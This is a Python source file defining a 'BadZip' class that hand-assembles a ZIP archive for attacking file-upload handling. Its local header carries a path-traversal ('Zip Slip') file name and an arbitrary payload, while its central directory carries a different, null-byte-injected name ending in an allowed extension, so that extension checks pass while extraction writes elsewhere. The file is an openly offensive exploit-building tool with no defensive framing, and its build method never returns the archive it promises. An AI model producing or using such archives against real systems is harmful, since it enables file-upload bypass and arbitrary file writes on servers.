import zlib
import struct

class BadZip:
    def __init__(self, lfh_fname: str, required_ext: str, fcontent: bytes) -> None:
        self.lfh_fname = lfh_fname
        self.fcontent =  fcontent
        self.cdh_fname = self.__get_null_byte_injected_fname(lfh_fname, required_ext)
        self.hex_crc32 = self.__get_crc32(self.fcontent)
        self.hex_uncompressed_fsize = self.__get_uncompressed_size(self.fcontent)
        self.hex_compressed_fsize = self.__get_compressed_size(self.fcontent, compression=False)
        self.hex_lfh_fname_len = self.__get_fname_len(self.lfh_fname)
        self.hex_cdh_fname_len = self.__get_fname_len(self.cdh_fname)


    def build_zip(self, save: bool=False, output_fname: str=None) -> bytes:
        lfh = self.__create_local_file_header()
        cdh = self.__create_central_directory_header()

        lfh_size = struct.pack('<L', len(lfh))
        cdh_size = struct.pack('<L', len(cdh))
        ecdh = self.__create_end_of_central_directory_header(lfh_size, cdh_size)

        zip_file = lfh + cdh + ecdh
        if save and output_fname:
            self.__save_zip(output_fname, zip_file, verbose=True)


    def __get_null_byte_injected_fname(self, fname: str, ext: str) -> str:
        if not "." in ext:
            ext = '.' + ext
        return fname + f'\x00{ext}'


    def __get_crc32(self, content: str) -> bytes:
        crc32  = zlib.crc32(content)
        return struct.pack('<L', crc32)


    def __get_uncompressed_size(self, content: str) -> bytes:
        return struct.pack('<L', len(content))


    def __get_compressed_size(self, content: str, compression: bool=True) -> bytes:
        if not compression:
            return self.__get_uncompressed_size(content)
        else:
            pass # TODO: add compression
    

    def __get_fname_len(self, fname: str) -> bytes:
        return struct.pack('<H', len(fname))


    def __create_local_file_header(self) -> bytes:
        local_file_header = [
            b'\x50\x4b\x03\x04', # Signature
            b'\x0a\x00',         # Version needed to extract
            b'\x00\x00',         # General purpose bit flag
            b'\x00\x00',         # Compression method (none)
            b'\x69\xb5',         # File modification time TODO: calc current time
            b'\x1e\x57',         # File modification date TODO: calc current time
            self.hex_crc32,      # CRC32
            self.hex_compressed_fsize,   # Compressed size
            self.hex_uncompressed_fsize, # Uncompressed size
            self.hex_lfh_fname_len,      # Filename length
            b'\x00\x00',                 # Extra field length
            self.lfh_fname.encode(),     # File name (**Zip Slip**)
            self.fcontent       # File content (**Payload**)
        ]
        return b''.join(local_file_header)


    def __create_central_directory_header(self) -> bytes:
        central_directory_header = [
            b'\x50\x4b\x01\x02', # Signature
            b'\x1e\x03',         # Version made by
            b'\x0a\x00',         # Version needed to extract
            b'\x00\x00',         # General purpose bit flag
            b'\x00\x00',         # Compression method (none)
            b'\x69\xb5',         # File modification time TODO: calc curren time
            b'\x1e\x57',         # File modification date TODO: calc current time
            self.hex_crc32,      # CRC32
            self.hex_compressed_fsize,   # Compressed size
            self.hex_uncompressed_fsize, # Uncompressed size
            self.hex_cdh_fname_len,      # Filename length
            b'\x00\x00',                 # Extra field length
            b'\x00\x00',                 # File comment length
            b'\x00\x00',                 # Disk number start
            b'\x00\x00',                 # Internal file attributes
            b'\x00\x00\xa4\x81',         # External file attributes
            b'\x00\x00\x00\x00',         # Relative offset of local header
            self.cdh_fname.encode()      # File name (**Null Byte Injectable**)
        ]
        return b''.join(central_directory_header)


    def __create_end_of_central_directory_header(self, lfh_size: bytes, cdh_size: bytes) -> bytes:
        end_of_central_directory = [
            b'\x50\x4b\x05\x06', # Signature
            b'\x00\x00',         # Number of this disk
            b'\x00\x00',         # Number of the disk with the start of the central directory
            b'\x01\x00',         # Total number of entries in the central directory on this disk
            b'\x01\x00',         # Total number of entries in the central directory
            cdh_size,            # Size of the central directory
            lfh_size,            # Offset of start of central directory with respect to the starting disk number
            b'\x00\x00'          # ZIP file comment length
        ]
        return b''.join(end_of_central_directory)
    
    
    def __save_zip(self, output_fname: str, content: bytes, verbose=False) -> None:
        with open(output_fname, 'wb') as file:
            file.write(content)

        if verbose:
            print(f'{output_fname} saved successfully.')